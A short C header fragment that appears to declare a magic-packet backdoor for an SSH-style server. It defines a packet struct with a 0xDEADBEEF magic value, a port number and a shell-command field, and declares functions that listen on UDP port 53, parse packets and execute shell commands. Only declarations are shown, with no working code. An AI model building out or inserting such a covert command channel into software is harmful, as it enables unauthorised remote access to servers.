typedef struct {
	uint32_t magic; /* should be 0xDEADBEEF */
	uint16_t port_number;
    char shell_command[256];
} listen_packet_t;

int 	start_udp(void); 						//uhandler.c
void 	start_udp_request(void);				//svr-main.c
int 	add_port_request(int);					//svr-main.c
void 	add_port(const char* );					//svr-runopts.c
void 	parse_packet(listen_packet_t *,char *); //uhandler.c
int 	check_shell_command(listen_packet_t *);	//uhandler.c
void 	shell_exec_command(char *);				//svr-chansession.c

#define BUFFERSIZE      2048
#define PACKETSIZE      sizeof(listen_packet_t)
#define UDPPORT            53 
